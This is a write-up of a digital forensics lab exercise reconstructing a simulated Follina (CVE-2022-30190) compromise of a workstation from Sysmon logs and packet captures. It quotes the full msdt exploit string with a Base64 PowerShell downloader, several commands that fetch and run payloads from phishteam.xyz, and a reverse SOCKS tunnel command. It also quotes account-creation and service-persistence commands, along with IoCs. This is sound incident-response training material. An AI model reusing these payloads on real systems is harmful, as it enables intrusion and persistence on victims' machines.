

# Introduction

This report documents the investigation of a simulated cybersecurity incident conducted as part of a hands-on Digital Forensics and Incident Response (DFIR) lab. 
The objective of this exercise was to:
- analyze the provided forensic artifacts, 
- reconstruct the complete attack timeline, 
- identify the adversary's tactics, techniques, and procedures (TTPs), and document the findings using a structured incident response methodology.

The investigation was performed using Windows Event Logs, Sysmon logs, and network packet captures (PCAP), with supporting analysis in DFIR tools such as Timeline Explorer, SysmonView, Wireshark. The report covers the attack lifecycle from initial access through execution, payload delivery, persistence, privilege escalation, and post-exploitation activities, while also extracting Indicators of Compromise (IoCs) and mapping observed attacker behavior to the MITRE ATT&CK framework.

**Note:** This report is based on a controlled training environment and represents a laboratory exercise rather than a real-world security incident.


# Incident Architecture 
![[ChatGPT Image Jun 24, 2026, 08_12_40 AM.png]]

# Incident Scenario
Incident Responder has a task to conduct an investigation from a workstation affected by a full attack chain.

```Mathematica 
User
 ↓
Downloads malicious Word document
 ↓
Word executes PowerShell
 ↓
PowerShell downloads Stage 2 payload
 ↓
Stage 2 establishes persistence
 ↓
Stage 2 contacts C2 server
 ↓
Attacker executes discovery commands
 ↓
Attacker deploys reverse SOCKS proxy
 ↓
Privilege Escalation occurs
 ↓
Attacker gains SYSTEM
 ↓
Additional persistence mechanisms created
 ↓
Machine fully compromised
```


# Prepare
- **convert** sysmon logs to **csv** 
- open csv logs file with **TimelineExplorer**
![[Pasted image 20260612054752.png]]




# IR Investigation
### Initial Access

- Initial Infection Vector
	- a malicious document is downloaded by `chrome.exe`, run by `winword.exe`
	- this malicious document run powershell command downloading the stage 2 file. 
	  exploiting a known CVE which allow the user to run commands on a remote machine.  
	- The malicious document then executed a chain of commands to attain code execution.
- Which file was opened?
	- `free_magicules.doc`
- When was it opened?
	- downloaded at `2022-06-20 17:12:58`
	- opened at `2022-06-20 17:13:12`
- Who opened it?
	- the user `benimaru` on `TEMPEST` machine


### Execution

- What process executed the malicious document?
	- executed by `winword.exe`
- What child processes did it spawn?
	- encoded/Base64  powershell command
```powershell
C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"
```

- The decoded command:
	- It’s a typical first-stage malware downloader setting persistence in the user Startup folder.
![[Pasted image 20260614014209.png]]

#### Breakdown:
```powershell
$app=[Environment]::GetFolderPath('ApplicationData')
```
- Gets the user’s **AppData directory** (hidden user space, commonly abused for malware).

```powershell
cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"
```
- Moves to the **Startup folder**, which executes files automatically on login (persistence).

```powershell
iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip
```
- Uses **Invoke-WebRequest (iwr)** to download a ZIP file from a **malicious/phishing domain**.

```powershell
Expand-Archive .\update.zip -DestinationPath .
```
- Extracts the downloaded archive in the Startup folder (likely dropping payload or script).

```powershell
rm update.zip
```
- Deletes the original ZIP to **reduce forensic evidence**.




### Exploitation

- Which vulnerability was exploited?
	- which is execution for  CVE-2022-30190 = 
	  Microsoft Windows Support Diagnostic Tool (MSDT) Remote Code Execution Vulnerability
	  [CVE Record: CVE-2022-30190](https://www.cve.org/CVERecord?id=CVE-2022-30190)
- Exploitation Workflow
	- `WINWORD.EXE` opened the malicious document (`free_magicules.doc`)
	- Immediately after execution, a **CVE-2022-30190 (MSDT/Follina)** payload was triggered:
	    - `msdt.exe` executed with a malicious `ms-msdt:` URI
	    - embedded **Base64 PowerShell execution chain**
	- leads to:
	    - `powershell.exe` execution
	    - `certutil.exe` downloading `first.exe`
	    - `first.exe` being executed successfully
		
### Payload Delivery
As vulnerability exploitation, powershell command is executed (spawned by `explorer.exe`) without GUI. then, download the payload `first.exe` using `certutil`.
Then, execute the payload.

```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
```

```mathematica 
explorer.exe (5784)
        ↓
powershell.exe (9052)
        ↓
certutil.exe (7484)
        ↓
first.exe (downloaded. then, executed)
```

- What payloads were downloaded?
	- The attacker downloaded a second-stage payload named **`first.exe`**.
- From which domain/IP?
	- `hxxp://phishteam[.]xyz/02dcf07/first[.]exe`
	- resolve the domain with wireshark ==> `167.71.199.191`
- What tools were used for download?
	- The attacker used **PowerShell** to execute a hidden command chain.
	- The actual file download was performed using **certutil.exe**:
```powershell
certutil -urlcache -split -f hxxp://phishteam[.]xyz/02dcf07/first[.]exe C:\Users\Public\Downloads\first.exe
```

- The payload was saved to:
```
C:\Users\Public\Downloads\first.exe
```



### Stage 2 Activity

- `first.exe` malicious actions
	- Analysis of process creation events indicates that `first.exe` performed host reconnaissance and user enumeration activities immediately after execution. 
	  The malware gathered information about the current user context, local user accounts, and administrator group membership. In addition, it launched a reverse SOCKS proxy client to establish remote access for the attacker.
	- The malware also generated a DNS request to `resolvecyber.xyz`, which resolved to `167.71.222.162`.

- Created Processes:
  The following child processes were spawned by `first.exe`:

| **Process**                                 | **Purpose**                              |
| ------------------------------------------- | ---------------------------------------- |
| `whoami.exe`                                | Identify current execution context       |
| `net.exe users`                             | Enumerate local user accounts            |
| `net.exe localgroup administrators`         | Enumerate administrator group members    |
| `net.exe user benimaru`                     | Query details of a specific user account |
| `ch.exe client 167.71.199.191:8080 R:socks` | Establish reverse SOCKS proxy access     |
Observed command executions:

```powershell
C:\Windows\system32\whoami.exe
C:\Windows\system32\net.exe users
C:\Windows\system32\net.exe localgroup administrators
C:\Windows\system32\net.exe user benimaru
C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
```


- Created Files:
	- Based on the available evidence, no direct file creation events attributable to `first.exe` were identified during this stage. 
	  However, the execution of `ch.exe` from the user's Downloads directory indicates that an additional payload had previously been downloaded and was subsequently used to establish remote access.


![[Pasted image 20260614035350.png]]
![[Pasted image 20260614035544.png]]





### Network Activity

- Contacted Domains 
	- `phishteam[.]xyz`
	- `resolvecyber[.]xyz`
- Contacted IPs
	- `167.71.222.162`
	- `167.71.199.191`
- there are 13 encoded commands, get them, then, decode via C2 communication.
- programming language was used to compile the binary?

> [!tip] Nim
>  - **Nim** is a **statically typed, compiled, general-purpose systems programming language** that aims to be _efficient_, _expressive_, and _elegant_.
>  **Key features**:
>  - Python-like readable syntax (indentation-based, clean).
>  - Compiles to **C, C++, JavaScript**, or other backends → produces small, fast, dependency-free native executables.
>  - Excellent **performance** (close to C/C++) combined with high-level productivity.
>  - Strong **metaprogramming** (code that writes code) and macros.
>  - Supports multiple paradigms: procedural, functional, object-oriented, concurrent.
>  - Deterministic memory management (customizable with destructors/move semantics, no mandatory GC).
>  - Great interoperability with C/C++ libraries.
>  
>  It was created by **Andreas Rumpf** (starting around 2008) and is developed by a small but dedicated team. Many people describe it as trying to give you "the performance of C, the productivity of Python, and the extensibility of Lisp."
> 
> **Website**: [nim-lang.org](https://nim-lang.org/) 


##### How to get all encoded C2 commands

![[Pasted image 20260614075919.png|697]]

Script 
```bash
tshark -r capture.pcapng -Y "http.request" -T fields -e http.request.uri \
| sed -n 's/.*q=\(.*\)/\1/p' \  # searching for value after "?q="
| while read b64; do
    echo "$b64" | base64 -d
    echo -e "\n====================\n"
done
```


### Discovery

- What reconnaissance commands were executed?
	- After establishing command and control access, the attacker executed multiple reconnaissance commands to enumerate users, privileges, network services, and the file system. Observed commands included:
```powersell
whoami 
pwd 
dir C:\Users 
net users 
net localgroup administrators 
net user benimaru 
dir C:\Users\benimaru 
dir C:\Users\benimaru\Desktop 
netstat -ano -p tcp 
whoami /priv
```


- The attacker collected:
	- Current user context (`TEMPEST\benimaru`)
	- Current working directory
	- Local user accounts
	- Local administrator group membership
	- Detailed information about user account `benimaru`
	- User profile directories and files
	- Desktop contents
	- Network connections and listening services
	- Available privileges on the compromised host
	- PowerShell script contents stored on the desktop

Notably, the attacker discovered credentials stored in:
```
C:\Users\benimaru\Desktop\automation.ps1
```

containing:
```
TEMPEST\benimaru
infernotempest
```


- The attacker performed extensive host, user, and network enumeration, including:
	- User enumeration (`net users`)
	- Administrator enumeration (`net localgroup administrators`)
	- User profile enumeration
	- Network service enumeration (`netstat`)
	- Privilege enumeration (`whoami /priv`)
	- Credential discovery from accessible files

These actions indicate active post-exploitation reconnaissance prior to privilege escalation.


### Persistence
``` mathematica
(Follina → first.exe → ch.exe → WinRM → spf.exe → final.exe → SYSTEM → Persistence)
```

- Persistence Mechanisms:
	- Startup Folder persistence via malicious files extracted from `update.zip`.
	- Windows Service persistence via `final.exe` executed when start.
	- Add users to Security Administration Group

- Were Startup folders modified?
	- Base64-decoded PowerShell command extracted and executed the command below,
	  The Startup folder was populated with files extracted from `update.zip`, providing persistence at user logon. **as illustrated within Execution section**
```powershell 
$app=[Environment]::GetFolderPath('ApplicationData');
cd "$app\Microsoft\Windows\Start Menu\Programs\Startup";
iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip;
Expand-Archive .\update.zip -DestinationPath .;
rm update.zip;
```


- Services Installation
	- Service persistence was established through the command below,
	  Service runs automatically as **LocalSystem**.
```powershell 
sc.exe create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
```


### Remote Access

- WinRM 
	- `wsmprovhost.exe` service spawn powershell commands downloading:
		- `spf.exe`
		- `final.exe`
	This is consistent with PowerShell Remoting / WinRM activity.

- Reverse Shell Establishment
	- The attacker obtained an interactive shell through the downloaded tools and later executed commands remotely through WinRM.

- SOCKS proxy deployment
	- This observed command establishes a reverse SOCKS tunnel back to attacker infrastructure:
```powershell 
ch.exe client 167.71.199.191:8080 R:socks
```

- Which binary provided remote access?
	- `ch.exe`
	- Executed from:
```
C:\Users\benimaru\Downloads\ch.exe
```



```powershell
# 17:17:36 
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" iwr http://phishteam.xyz/02dcf07/ch.exe -outfile C:\Users\benimaru\Downloads\ch.exe

# 
C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
```

### Privilege Escalation

- Privilege Escalation Attempt
```POWERSHELL
whoami /priv # was executed before privilege escalation activity.
```

```powershell
# when running 
whoami

# returned
NT AUTHORITY\SYSTEM
```


- Technique/Tool:
	- The exact exploit is not directly visible in the available artifacts.
	  However, `spf.exe` was downloaded immediately before SYSTEM access.
	  So, It is the most likely privilege escalation component.


- When was privilege escalated (**SYSTEM access**)?
	- After execution of `spf.exe`.
	- Before:
	    - Service creation
	    - Administrator password modification
	    - User creation activities
	The first confirmed indicator is:
```powershell
NT AUTHORITY\SYSTEM # returned from attacker commands
```






### Post-Exploitation

##### Additional Downloaded Payloads 
```
update.zip
first.exe
ch.exe
spf.exe
final.exe
```


##### Executed Commands after Escalation?
```
whoami
whoami /priv
net usersnet localgroup administrators
net user benimaru
dir C:\Users
dir C:\Users\benimaru
dir Desktop
netstat -ano -p tcp
```

##### Persistence creation:
```
"C:\Windows\system32\sc.exe" \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
```

##### Account manipulation:
```
net user Administrator ch4ng3dpassword!
net user /add shuna princess
net user /add shion m4st3rch3f!
net localgroup administrators shion /add
```

##### Targeted Credentials 
- The attacker discovered credentials stored inside:
```powershell
C:\Users\benimaru\Desktop\automation.ps1

# containing
TEMPEST\benimaru  
infernotempest 
```
Additionally, the built-in Administrator account password was modified.


##### Lateral Movement attempt
- Yes, or at minimum prepared for.
Evidences:
- Reverse SOCKS proxy deployment (`ch.exe`)
- WinRM usage (`wsmprovhost.exe`)
- Discovery of credentials
- Discovery of local administrators
- Creation of new administrative accounts

##### Observed accounts:
```
shuna
shion
```

##### Administrative membership granted:
```
net localgroup administrators shion /add
```

This provided the attacker with additional privileged access suitable for lateral movement within the environment.




### Impact & Scope

#### Affected user accounts

The following user accounts were affected during the intrusion:

| **Account**         | **Impact**                                                      |
| --------------- | ----------------------------------------------------------- |
| `benimaru`      | Initial compromised user                                    |
| `Administrator` | Password modified by attacker                               |
| `shuna`         | Malicious account created                                   |
| `shion`         | Malicious account created and added to Administrators group |

#### Modified Files
- The attacker downloaded, created, or executed the following files:
```powershell 
C:\Users\benimaru\Downloads\free_magicules.doc
C:\Users\Public\Downloads\first.exe
C:\Users\benimaru\Downloads\ch.exe
spf.exe
C:\ProgramData\final.exe
update.zip
```

- Additionally:
```
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
```
was modified through extraction of `update.zip` contents.


#### Remained artifacts

Persistence Artifacts:
```
Startup Folder files
TempestUpdate2 Service
C:\ProgramData\final.exe
```

User Artifacts:
```
shuna account
shion account
Modified Administrator account
```

Network Artifacts:
```
Connections to phishteam.xyz
Connections to resolvecyber.xyz
Connections to 167.71.199.191:8080
```

Log Artifacts:
```
Sysmon Event ID 1
Sysmon Event ID 3
Sysmon Event ID 11
Sysmon Event ID 22
PowerShell Execution Events
```


### Extracted IoCs 

#### Domains
```
phishteam.xyz
resolvecyber.xyz
```

#### IPs
```
167.71.199.191
167.71.222.162
```

#### Files
```
free_magicules.doc
update.zip
first.exe
ch.exe
spf.exe
final.exe
```

##### free_magicules.doc

| MD5         | `09b09dc651d921fe022b16c234e64a12`                                 |
| ----------- | ------------------------------------------------------------------ |
| SHA-1       | `36e718533b9530002143f69fd15b679208096aec`                         |
| SHA-256     | `e25f32401fd3d25958b8b99f280f0325b232e54f185cc5d6e0710923005ac64a` |
| File type   | Win32 EXE                                                          |
| File size   | 1.54 MB                                                            |
| Family name | WINWORD.EXE                                                        |

**Behavioral Info**
```
Initial infection document
Delivered through Chrome download
Exploited CVE-2022-30190 (Follina)
Triggered MSDT execution
Executed embedded Base64 PowerShell payload
```

**Network Indicators**
```
phishteam.xyz
http://phishteam.xyz/02dcf07/update.zip
```

**ATT&CK Mapping**
```
T1204     User Execution
T1203     Exploitation for Client Execution
T1059.001 PowerShell
```

---

##### update.zip

 **Behavioral Info**
```
Downloaded by PowerShell
Extracted into Startup folderUsed to establish persistence
Deleted after extraction
```

**Network Indicators**
```
http://phishteam.xyz/02dcf07/update.zip
phishteam.xyz
```

**ATT&CK Mapping**
```
T1105     Ingress Tool Transfer
T1547.001 Startup Folder Persistence
```

---

##### first.exe

**Behavioral Info**
```
Stage 2 malware payload
Executed host reconnaissance
Enumerated users and administrator groups
Executed whoami and net commands
Downloaded and launched remote access tooling
Performed DNS resolution
```

**Network Indicators**
```
phishteam.xyz
resolvecyber.xyz
167.71.222.162
```

**ATT&CK Mapping**
```
T1105      Ingress Tool Transfer
T1033      System Owner/User Discovery
T1087      Account Discovery
T1069.001  Local Group Discovery
T1083      File and Directory Discovery
T1049      Network Connections Discovery
```

---

##### ch.exe

| MD5         | `527c71c523d275c8367b67bbebf48e9f`                                 |
| ----------- | ------------------------------------------------------------------ |
| SHA-1       | `7902b08fb184cfb9580d0ad950baf048a795f7c1`                         |
| SHA-256     | `8a99353662ccae117d2bb22efd8c43d7169060450be413af763e8ad7522d2451` |
| File type   | `Win32 EXE`                                                        |
| File size   | 7.85 MB                                                            |
| Family name | `chisel.exe`                                                       |

**Behavioral Info**
```
Reverse SOCKS proxy client
Provided attacker pivoting capability
Established remote access channel
Maintained outbound connection to attacker infrastructure
```

**Network Indicators**
```
167.71.199.191:8080resolvecyber.xyz
```

**ATT&CK Mapping**
```
T1090        ProxyT1021        Remote Services
```

---

##### spf.exe

| MD5         | `108da75de148145b8f056ec0827f1665`                                 |
| ----------- | ------------------------------------------------------------------ |
| SHA-1       | `188098b9caf3bc4d1b68dcad50d2e1cbd2e9d519`                         |
| SHA-256     | `8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d` |
| File type   | `Win32 EXE`                                                        |
| File size   | 26.50 KB                                                           |
| Family name | `PrintSpoofer64.exe`                                               |
[itm4n/PrintSpoofer: Abusing impersonation privileges through the "Printer Bug"](https://github.com/itm4n/PrintSpoofer)

**Behavioral Info**
```
Downloaded after attacker gained shell access
Executed prior to SYSTEM-level access
Likely privilege escalation component
Used during escalation phase
```

**Network Indicators**
```
http://phishteam.xyz/02dcf07/spf.exe
phishteam.xyz
```

**ATT&CK Mapping**
```
T1105      Ingress Tool Transfer
T1068      Exploitation for Privilege Escalation
```

---

##### final.exe

| MD5       | 4c014f94a8fa0b484a2edab422ab2a1a                                 |
| --------- | ---------------------------------------------------------------- |
| SHA-1     | 1cd504a2599c5287e6a90d59780bd57fbba1e923                         |
| SHA-256   | 03e1840a24506afc88ab5ff7f83d2b07b558b34ff42dd34dd93267fd2e7a74e6 |
| File type | Win32 EXE                                                        |
| File size | 499.70 KB                                                        |


**Behavioral Info**
```
Downloaded after privilege escalation
Installed as persistent service
Executed under LocalSystem account
Maintained long-term access
```

**Network Indicators**
```
http://phishteam.xyz/02dcf07/final.exe
phishteam.xyz
```

**ATT&CK Mapping**
```
T1105       Ingress Tool Transfer
T1543.003   Create or Modify System Process: Windows Service
T1078       Valid Accounts (post-compromise persistence context)
```

---


##### Processes
```
winword.exe 
msdt.exe
powershell.exe
certutil.exe
wsmprovhost.exe
ch.exe
spf.exe
final.exe
```


##### Service: TempestUpdate2

**Behavioral Info**
```
Auto-start Windows service
Executes final.exe
Runs as LocalSystem
Provides persistence across reboots
```

**Network Indicators**
```
Indirectly associated with final.exe communications
```

**ATT&CK Mapping**
```
T1543.003 Create or Modify System Process: Windows Service
```


##### URLs
```
http://phishteam.xyz/02dcf07/update.zip
http://phishteam.xyz/02dcf07/first.exe
http://phishteam.xyz/02dcf07/ch.exe
http://phishteam.xyz/02dcf07/spf.exe
http://phishteam.xyz/02dcf07/final.exe
```

##### ATT&CK IoCs
T1204 - User Execution  
T1203 - Exploitation for Client Execution  
T1059.001 - PowerShell  
T1105 - Ingress Tool Transfer  
T1547.001 - Startup Folder Persistence  
T1543.003 - Windows Service Persistence  
T1033 - System Owner/User Discovery  
T1087 - Account Discovery  
T1069.001 - Local Group Discovery  
T1083 - File and Directory Discovery  
T1049 - Network Connections Discovery  
T1068 - Privilege Escalation  
T1090 - Proxy  
T1136.001 - Create Local Account  
T1098 - Account Manipulation  
T1021.006 - Windows Remote Management  
T1552.001 - Credentials In Files


##### C2 Commands

**Discovery**
```powersell
whoami
net users
net localgroup administrators
net user benimaru
netstat -ano -p tcp
dir C:\Users
```

**Initial Access**
```powersell
powershell iwr http://phishteam.xyz/02dcf07/ch.exe -outfile C:\Users\benimaru\Downloads\ch.exe
```

**Credential Access**
```powershell
cat C:\Users\Benimaru\Desktop\automation.ps1
net user Administrator ch4ng3dpassword!
```

**Persistence**
```powersell
sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
sc.exe qc TempestUpdate2
```

**Account Manipulation**
```powersell
net user shuna ...
net user shion ...
net localgroup administrators shion /add
net user Administrator <new password>
```

**Privilege Escalation**
```powersell
whoami /priv
net localgroup administrators /add shion
``` 

**Remote Access**
```powershell
ch.exe client 167.71.199.191:8080 R:socks
```

**Account Creation**
```powershell
net user /add shuna princess
net user /add shion m4st3rch3f!
```



### Incident Conclusion
The attacker successfully compromised user `benimaru` through exploitation of **CVE-2022-30190 (Follina)**, 
established persistence through Startup Folder and Windows Service mechanisms, 
deployed a reverse SOCKS proxy for remote access, 
escalated privileges to **NT AUTHORITY\SYSTEM**, 
created additional privileged accounts, and maintained long-term access to the host.


> One workstation was compromised. 
> The attacker achieved SYSTEM-level access, 
> established persistence via Startup Folder and Windows Service mechanisms,
> deployed a reverse SOCKS proxy, 
> created additional administrative accounts, 
> and maintained remote access through attacker-controlled infrastructure.

### Timeline

```text
=== Initial Access ===

17:12:58 = chrome.exe downloads free_magicules.doc
17:13:12 = WINWORD.EXE opens free_magicules.doc
17:13:35 = msdt.exe executes embedded Base64 PowerShell payload (Follina / CVE-2022-30190)

=== Payload Delivery ===

17:15:10 = explorer.exe -> powershell.exe -> certutil.exe downloads first.exe
17:15:15 = first.exe executed

=== Discovery ===

17:15:15 = first.exe performs DNS lookup to resolvecyber.xyz
17:15:24 = first.exe creates temporary PowerShell policy test file
17:15:25 = Host reconnaissance (whoami)
17:15:38 = User enumeration (net users)
17:15:42 = Local administrators enumeration (net localgroup administrators)
17:15:48 = User information enumeration (net user benimaru)

=== Remote Access Establishment ===

17:17:36 = powershell.exe downloads ch.exe
17:17:38 = powershell.exe communicates with phishteam.xyz
17:17:53 = first.exe communicates with resolvecyber.xyz
17:18:48 = ch.exe establishes reverse SOCKS proxy connection

=== Interactive Access / WinRM ===

17:19:06 = wsmprovhost.exe activity begins
17:19:07 = Additional temporary file created
17:19:15 = Remote command execution via WinRM (whoami)

=== Privilege Escalation ===

17:20:06 = wsmprovhost.exe downloads spf.exe
17:21:05 = wsmprovhost.exe downloads final.exe
17:21:34 = spf.exe launches final.exe
17:21:36 = final.exe communicates with attacker infrastructure
17:21:38 = SYSTEM privilege verification activity begins (whoami)
17:21:38 = NT AUTHORITY\SYSTEM access obtained

=== Post-Exploitation ===

17:21:58 = Account enumeration (net user shuna)
17:22:01 = User enumeration (net users)
17:22:30 = User information enumeration (net user shuna)
17:22:44 = Creation/modification of account: shuna
17:22:47 = User enumeration (net users)
17:23:23 = Creation/modification of account: shion
17:23:28 = User enumeration (net users)
17:23:54 = Administrator password modified
17:25:16 = Password modification for shion account
17:25:24 = User enumeration (net users)
17:25:32 = Privilege enumeration (whoami /priv)

=== Persistence ===

17:26:28 = Service configuration query: TempestUpdate2
17:26:29 = Persistence established via Windows Service (TempestUpdate2)
```



### Appendix – Investigation Artifacts  
  
The forensic artifacts used during this DFIR laboratory exercise are available for educational and reproducibility purposes.  

Artifacts:  
- Sysmon.evtx  
- Sysmon.csv  
- Windows.evtx  
- traffic.pcap  

> To download Artifacts:
 [DFIR-Reports/Tempest-Incident/Artifacts at main · Mabdelnaby1924/DFIR-Reports](https://github.com/Mabdelnaby1924/DFIR-Reports/tree/main/Tempest-Incident/Artifacts)







